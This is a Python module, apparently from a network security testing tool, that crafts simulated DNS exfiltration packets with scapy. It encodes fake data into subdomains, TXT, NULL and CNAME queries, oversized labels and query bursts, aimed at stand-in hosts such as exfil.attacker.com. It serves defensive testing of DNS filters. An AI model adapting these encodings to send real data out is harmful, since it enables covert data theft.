"""DNS exfiltration traffic module."""

import base64
import hashlib
import random
import string
from collections.abc import Iterator

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.packet import Packet

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Known DNS exfiltration tool domains
EXFIL_DOMAINS = [
    "exfil.attacker.com",
    "data.malicious.net",
    "tunnel.evil.org",
    "c2.badactor.io",
    "dns.collector.xyz",
]


class DNSExfiltrationModule(TrafficModule):
    """Traffic module for DNS exfiltration patterns.

    Generates DNS queries that simulate data exfiltration
    via DNS subdomain encoding.
    """

    def __init__(self) -> None:
        """Initialize the DNS exfiltration module."""
        self._query_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="dns_exfiltration",
            description="DNS-based data exfiltration (encoded subdomains, oversized queries)",
            category=TrafficCategory.DNS_FILTER,
            protocols=["UDP"],
            ports=[53],
        )

    def _generate_base64_exfil(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate base64-encoded data in DNS subdomain."""
        # Simulate exfiltrated data
        fake_data = "".join(random.choices(string.ascii_letters + string.digits, k=30))
        encoded = base64.b64encode(fake_data.encode()).decode().replace("=", "")

        # Split into DNS label-safe chunks (max 63 chars per label)
        chunks = [encoded[i : i + 50] for i in range(0, len(encoded), 50)]

        domain = random.choice(EXFIL_DOMAINS)
        qname = ".".join(chunks) + "." + domain

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="A"),
            )
        )
        yield packet

    def _generate_hex_exfil(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate hex-encoded data in DNS subdomain."""
        fake_data = "".join(random.choices(string.ascii_letters, k=20))
        encoded = fake_data.encode().hex()

        domain = random.choice(EXFIL_DOMAINS)
        qname = f"{encoded}.{domain}"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="A"),
            )
        )
        yield packet

    def _generate_txt_exfil(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate TXT record queries for data transfer."""
        # TXT records are often used for larger data chunks
        domain = random.choice(EXFIL_DOMAINS)
        seq_id = random.randint(1000, 9999)

        qname = f"data.{seq_id}.{domain}"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="TXT"),
            )
        )
        yield packet

    def _generate_high_frequency_exfil(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate high-frequency queries to single domain (suspicious pattern)."""
        domain = random.choice(EXFIL_DOMAINS)

        # Multiple queries in rapid succession
        for i in range(5):
            seq = f"seq{i:04d}"
            fake_data = hashlib.md5(f"{i}".encode(), usedforsecurity=False).hexdigest()[:16]
            qname = f"{seq}.{fake_data}.{domain}"

            packet = (
                IP(src=src_ip, dst=dst_ip)
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(
                    rd=1,
                    qd=DNSQR(qname=qname, qtype="A"),
                )
            )
            yield packet

    def _generate_oversized_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate oversized DNS queries."""
        # Create a very long subdomain
        long_label = "".join(random.choices(string.ascii_lowercase, k=60))  # Near max
        domain = random.choice(EXFIL_DOMAINS)

        qname = f"{long_label}.{long_label[:40]}.{domain}"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="A"),
            )
        )
        yield packet

    def _generate_null_subdomain(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate queries with NULL record type for covert channel."""
        domain = random.choice(EXFIL_DOMAINS)
        data_chunk = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))

        qname = f"{data_chunk}.{domain}"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="NULL"),  # NULL record type
            )
        )
        yield packet

    def _generate_cname_chain(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate CNAME queries for potential chain abuse."""
        domain = random.choice(EXFIL_DOMAINS)
        encoded_data = base64.b32encode(b"sensitive-data").decode().lower().rstrip("=")

        qname = f"{encoded_data}.cname.{domain}"

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=qname, qtype="CNAME"),
            )
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate DNS exfiltration packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address (DNS server)
            dst_port: Destination port (ignored, always 53)

        Yields:
            Scapy packets with DNS exfiltration patterns
        """
        self._query_count += 1

        # Rotate through different exfiltration methods
        method = self._query_count % 7

        if method == 0:
            yield from self._generate_base64_exfil(src_ip, dst_ip)
        elif method == 1:
            yield from self._generate_hex_exfil(src_ip, dst_ip)
        elif method == 2:
            yield from self._generate_txt_exfil(src_ip, dst_ip)
        elif method == 3:
            yield from self._generate_high_frequency_exfil(src_ip, dst_ip)
        elif method == 4:
            yield from self._generate_oversized_query(src_ip, dst_ip)
        elif method == 5:
            yield from self._generate_null_subdomain(src_ip, dst_ip)
        else:
            yield from self._generate_cname_chain(src_ip, dst_ip)
